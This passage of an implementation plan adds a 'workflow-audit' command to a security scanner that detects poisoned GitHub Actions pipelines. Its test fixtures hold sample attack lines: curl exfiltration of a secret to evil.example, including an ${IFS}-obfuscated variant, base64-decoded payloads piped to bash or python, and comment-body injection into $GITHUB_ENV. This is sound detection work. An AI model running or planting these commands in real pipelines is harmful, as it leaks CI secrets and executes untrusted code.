                          cwd=str(cwd), capture_output=True, text=True)


def test_cli_text_output_and_fail_on_gate(tmp_path):
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    r = _run(["workflow-audit", ".", "--no-history"], tmp_path)
    assert "WF-EXFIL-001" in r.stdout
    assert r.returncode == 1            # HIGH >= default --fail-on high


def test_cli_sarif_output(tmp_path):
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    r = _run(["workflow-audit", ".", "--no-history", "--format", "sarif"], tmp_path)
    doc = json.loads(r.stdout)
    assert doc["version"] == "2.1.0"


def test_cli_clean_repo_exit_zero(tmp_path):
    _mk(tmp_path, ".github/workflows/ci.yml",
        "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n      - run: echo ok\n"
        "    permissions:\n      contents: read\n")
    r = _run(["workflow-audit", ".", "--no-history"], tmp_path)
    assert r.returncode == 0
```

- [ ] **Step 3: Run test to verify it fails**

Run: `pytest tests/test_workflow_audit_cli.py -v`
Expected: FAIL — `workflow-audit` is not a known subcommand (argparse error / nonzero with usage)

- [ ] **Step 4: Write minimal implementation**

Add a handler and register the subparser, mirroring the `agent-audit` block. Handler:

```python
# credence/cli.py  (add handler; place near other cmd_* handlers)
def cmd_workflow_audit(args) -> int:
    from credence.workflow_audit.scan import scan
    from credence.workflow_audit.report import render_report
    from credence.workflow_audit.sarif import to_sarif
    from credence.cli_gating import exit_code_for

    findings = scan(
        args.path,
        history=not args.no_history,
        include_unreachable=args.include_unreachable,
        since=args.since,
        max_commits=args.max_commits,
        extra_hosts=set(args.allow_host or []),
    )
    if args.disable_rule:
        disabled = set(args.disable_rule)
        findings = [f for f in findings if f["rule_id"] not in disabled]

    fmt = args.format
    if fmt == "json":
        out = json.dumps(findings, indent=2)
    elif fmt == "sarif":
        out = to_sarif(findings)
    else:
        out = render_report(findings)

    if args.output:
        Path(args.output).write_text(out)
    else:
        print(out)

    gating = [f for f in findings
              if not f.get("suppressed") or args.count_suppressed]
    return exit_code_for(gating, args.fail_on)
```

Register the subparser (inside the function that builds subparsers, mirroring agent-audit):

```python
    wf = subparsers.add_parser("workflow-audit",
        help="audit GitHub Actions workflows (working tree + git history) for poisoned-pipeline threats")
    wf.add_argument("path", nargs="?", default=".")
    wf.add_argument("--no-history", action="store_true",
                    help="skip the git-history pass")
    wf.add_argument("--include-unreachable", action="store_true",
                    help="also scan dangling/reflog commits (deleted branches)")
    wf.add_argument("--since", default=None)
    wf.add_argument("--max-commits", type=int, default=None)
    wf.add_argument("--allow-host", action="append", default=[],
                    help="treat HOST as a trusted installer/egress host (repeatable)")
    wf.add_argument("--disable-rule", action="append", default=[],
                    help="disable a rule by ID (repeatable)")
    wf.add_argument("--format", choices=["text", "json", "sarif"], default="text")
    wf.add_argument("-o", "--output", default=None)
    wf.add_argument("--count-suppressed", action="store_true",
                    help="re-arm suppressed findings for the --fail-on gate")
    from credence.cli_gating import add_fail_on_arg
    add_fail_on_arg(wf)          # adds --fail-on (default high)
    wf.set_defaults(func=cmd_workflow_audit)
```

If `cli.py` dispatches via `args.func(args)` returning an exit code, ensure `main()` does `sys.exit(args.func(args))` (it already does for other subcommands — match it).

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/test_workflow_audit_cli.py -v`
Expected: PASS (text gate exits 1, SARIF valid, clean repo exits 0)

- [ ] **Step 6: Commit**

```bash
git add credence/cli.py tests/test_workflow_audit_cli.py
git commit -m "feat(workflow-audit): CLI subcommand with text/json/sarif + --fail-on gate"
```

---

## Task 9: `full-audit` integration

**Files:**
- Modify: `credence/cli_advanced.py` (or wherever `full-audit` aggregates — confirm via grep)
- Test: `tests/test_workflow_audit_cli.py` (append)

- [ ] **Step 1: Locate the aggregator**

Run: `grep -rn "full-audit\|full_audit\|def cmd_full" credence/`
Find where `full-audit` collects sub-scan results. Add a workflow-audit section mirroring how `agent-audit`/`supply-chain` are aggregated (default bounds: history on, `include_unreachable=False`).

- [ ] **Step 2: Write the failing test**

```python
# tests/test_workflow_audit_cli.py  (append)
def test_full_audit_includes_workflow_findings(tmp_path):
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    r = _run(["full-audit", "."], tmp_path)
    assert "WF-EXFIL-001" in r.stdout or "workflow" in r.stdout.lower()
```

- [ ] **Step 3: Run test to verify it fails**

Run: `pytest tests/test_workflow_audit_cli.py -k full_audit -v`
Expected: FAIL — workflow findings absent from `full-audit`

- [ ] **Step 4: Write minimal implementation**

In the `full-audit` aggregator, add (matching the existing aggregation style; default bounds keep it fast):

```python
    # workflow-threat engine (working tree + bounded history, no dangling sweep)
    from credence.workflow_audit.scan import scan as _wf_scan
    try:
        wf_findings = _wf_scan(target_path, history=True, include_unreachable=False)
    except Exception:
        wf_findings = []
    # merge wf_findings into the aggregate result the same way other sections are merged
```

Render them under a "Workflow Threats" section consistent with the other sections, and include their severities in the aggregate `--fail-on` gate.

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/test_workflow_audit_cli.py -v`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add credence/cli_advanced.py tests/test_workflow_audit_cli.py
git commit -m "feat(workflow-audit): wire workflow-threat engine into full-audit"
```

---

## Task 10: Golden end-to-end + evasion regressions + docs/CHANGELOG

**Files:**
- Test: `tests/test_workflow_golden_e2e.py`
- Modify: `README.md`, `CHANGELOG.md`, `requirements.txt` (verify PyYAML present — it is since v0.7)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_golden_e2e.py
import subprocess
from pathlib import Path
from credence.workflow_audit.scan import scan


def _git(repo, *a):
    subprocess.run(["git", "-C", str(repo), *a], check=True, capture_output=True, text=True)


MAL = ("on: workflow_dispatch\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.PROD }}\n"
       "    steps:\n      - run: echo data | base64 -d | bash\n"
       "      - run: curl -d \"$T\" https://evil.example\n")


def test_golden_deletion_does_not_erase_history(tmp_path):
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "config", "user.email", "d@e.com")
    _git(tmp_path, "config", "user.name", "Dev")
    p = tmp_path / ".github/workflows/staging.yml"
    p.parent.mkdir(parents=True)
    p.write_text(MAL)
    _git(tmp_path, "add", "-A"); _git(tmp_path, "commit", "-q", "-m", "add")
    _git(tmp_path, "rm", "-q", ".github/workflows/staging.yml")
    _git(tmp_path, "commit", "-q", "-m", "delete it")

    findings = scan(tmp_path, history=True)
    ids = {f["rule_id"] for f in findings}
    assert "WF-HIST-001" in ids                    # persists despite deletion
    hist = [f for f in findings if f["rule_id"] == "WF-HIST-001"][0]
    assert hist["persists_in_history_only"] is True


def test_evasion_regressions_each_fire():
    cases = {
        "cross_step": ("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                       "      - run: echo x | base64 -d > /tmp/p.sh\n"
                       "      - run: bash /tmp/p.sh\n", "WF-EXEC-001"),
        "interp_decode": ("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                          "      - run: python3 -c \"$(echo x | base64 -d)\"\n", "WF-EXEC-001"),
        "ifs_obf": ("on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.P }}\n"
                    "    steps:\n      - run: cu${IFS}rl -d \"$T\" https://evil.example\n", "WF-EXFIL-001"),
        "github_env": ("on: issue_comment\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                       "      - run: echo \"X=${{ github.event.comment.body }}\" >> $GITHUB_ENV\n", "WF-INJ-002"),
    }
    import tempfile, os
    for name, (content, rule) in cases.items():
        with tempfile.TemporaryDirectory() as d:
            wf = Path(d) / ".github/workflows/c.yml"
            wf.parent.mkdir(parents=True)
            wf.write_text(content)
            ids = {f["rule_id"] for f in scan(d, history=False)}
            assert rule in ids, f"{name}: expected {rule}, got {ids}"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_golden_e2e.py -v`
Expected: FAIL if any wiring is incomplete; otherwise PASS once Plans 1–3 are done.

- [ ] **Step 3: Make it pass**

All production code already exists from Tasks 1–9; fix any integration gaps the e2e surfaces (most likely `${IFS}` normalization reaching the exfil rule — confirm `normalize_run` is applied in `taint.resolve_job` before exfil matching, which it is). No new production code expected beyond bug-fixes.

- [ ] **Step 4: Run the full workflow-audit suite**

Run: `pytest tests/ -k workflow -v`
Expected: PASS (all Plan 1–3 tests, ~55+)

- [ ] **Step 5: Update docs + CHANGELOG**

Add to `CHANGELOG.md` under a new `## [0.9.0]` heading:
```markdown
### Added
- `workflow-audit` command: GitHub Actions poisoned-pipeline detection over the
  working tree AND git history (incl. dangling commits via `--include-unreachable`).
  13 combination rules (obfuscated exec, secret exfil, script injection, blast
  radius) mapped to OWASP CICD-SEC + MITRE ATT&CK; job-scoped secret→sink taint;
  visible-only suppression; identity-as-context on history findings; text/JSON/SARIF;
  shared `--fail-on` gate; wired into `full-audit`. Zero network egress.
```
Add a short `workflow-audit` section to `README.md` (mirror the `agent-audit` entry).
Verify `PyYAML` is in `requirements.txt` (added v0.7 — **do not** add new deps).

- [ ] **Step 6: Commit**

```bash
git add tests/test_workflow_golden_e2e.py README.md CHANGELOG.md
git commit -m "test(workflow-audit): golden deletion-not-erasure e2e + evasion regressions; docs"
```

---

## Self-Review (against spec §3/§7/§8/§10)

- **Spec coverage:** history walk + dangling sweep (Pillar 2, F-006) ✓; identity-as-context ✓; `WF-HIST-001` persists-in-history-only ✓; dedup-to-earliest ✓; orchestrator → `List[Dict]` + fail-loud `WF-PARSE-001` (F-009) ✓; text/JSON/SARIF (§8) ✓; CLI flags incl. `--include-unreachable`/`--count-suppressed`/`--allow-host`/`--disable-rule` (§7) ✓; `--fail-on` via `cli_gating` ✓; `full-audit` integration ✓; golden e2e + evasion regressions + SARIF test (§10) ✓.
- **All 13 rules present across plans:** WF-EXEC-001/002, WF-EXFIL-001/002, WF-INJ-001/002, WF-CFG-001..006 (Plan 2) + WF-HIST-001 (Plan 3 Task 3) = 13. Plus the fail-loud `WF-PARSE-001` operational finding.
- **Placeholder scan:** the two CLI/aggregator tasks (8, 9) require reading existing `cli.py`/aggregator structure first (Step 1 of each) because exact insertion points depend on code not shown here — the handler/argument code itself is complete; only the *insertion site* is discovered at implementation time. This is an integration seam, not a placeholder in the logic.
- **Type consistency:** `scan()` returns `List[Dict]` (from `WorkflowFinding.to_dict()`); `cli_gating.exit_code_for(List[Dict], fail_on)` reads `d["severity"]` (uppercase) — matches Plan 1's `to_dict`. `scan_history(... working_tree_paths, dedup, include_unreachable, extra_hosts)` signature is used identically by `scan.py`. SARIF/report consume the same dict keys produced by `to_dict()`.

## Boundary
Plan 3 completes a shippable `workflow-audit` command. Impostor-commit detection (F-012 refinement) is best-effort and intentionally minimal in v1 (the zero-egress invariant precludes full repo-network verification) — `WF-CFG-003` flags `docker://` and unpinned refs but does not network-verify a SHA's repo membership. Target release: v0.9.0. New deps: none beyond PyYAML (already core).
```
